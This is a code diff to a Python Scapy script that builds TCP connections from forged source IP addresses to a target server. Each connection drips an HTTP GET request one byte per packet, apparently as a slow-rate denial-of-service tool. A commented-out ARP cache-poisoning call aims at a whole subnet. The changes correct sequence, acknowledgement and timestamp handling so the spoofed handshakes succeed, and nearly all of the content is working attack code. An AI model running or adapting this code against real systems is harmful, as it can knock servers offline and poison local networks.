@@ -23,8 +23,16 @@ stop = threading.Event()
 
 
 def arp_poison():
-    # arpcachepoison("10.1.2.3", "10.1.2.100", interval=1)
+    # arpcachepoison("10.1.2.3", "10.1.2.0/24", interval=1)
     pass
+
+
+def get_option(options, key):
+    for op in options:
+        k, *value = op
+        if k == key:
+            return value[0]
+
 
 
 def connection(_: None):
@@ -36,38 +44,47 @@ def connection(_: None):
             payload = f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n"
             syn = (
                     IP(dst=config.server_host, src=ip)
-                    / TCP(dport=80, sport=port, flags='S', win=64240,
+                    / TCP(dport=80, sport=port, flags='S', window=64240,
                           seq=random.randint(100, 100_000_000),
                           options=[
                               ("MSS", 1460),
                               ("SAckOK", ""),
                               ("Timestamp", (2350613787, 0)),  # (val, ecr)
                               ("NOP", 0),
-                              ("wscale", 7),
+                              ("WScale", 7),
                           ])
             )
             syn_ack = send_and_sniff(syn, ip, port)
             syn_ack.show()
             # logger.info(f"sniffed: {syn_ack.show()}")
+            ts = get_option(syn_ack[TCP].options, "Timestamp")
+            seq = syn_ack[TCP].seq + 1
             ack = (
                     IP(dst=config.server_host, src=ip)
-                    / TCP(dport=80, sport=port, flags='A', ack=1, window=502,
+                    / TCP(dport=80, sport=port, flags='A', ack=seq, window=502,
                           options=[
                               ("NOP", 0),
                               ("NOP", 0),
-                              ("Timestamp", (syn_ack[TCP].options["Timestamp"][1] + 1, syn_ack[TCP].options["Timestamp"][0])),  # (val, ecr)
+                              ("Timestamp", (ts[1] + 1, ts[0])),  # (val, ecr)
                           ])
             )
             send(ack, verbose=False)
             latest = ack
             for char in payload:
+                ts_ = get_option(latest[TCP].options, "Timestamp")
+                if ts_ is not None:
+                    ts = ts_
+                logger.info(latest[TCP].seq)
+                seq_ = latest[TCP].seq + 1
+                if seq_ != 1:
+                    seq = seq_
                 req = (
                         IP(dst=config.server_host, src=ip)
-                        / TCP(dport=80, sport=port, seq=latest[TCP].ack, ack=latest[TCP].seq + 1, flags='PA',
+                        / TCP(dport=80, sport=port, seq=latest[TCP].ack, ack=seq, flags='PA', window=502,
                               options=[
                                   ("NOP", 0),
                                   ("NOP", 0),
-                                  ("Timestamp", (syn_ack[TCP].options["Timestamp"][1] + 1, syn_ack[TCP].options["Timestamp"][0])),  # (val, ecr)
+                                  ("Timestamp", (ts[1] + 1, ts[0])),  # (val, ecr)
                               ])
                         / char.encode()
                 )
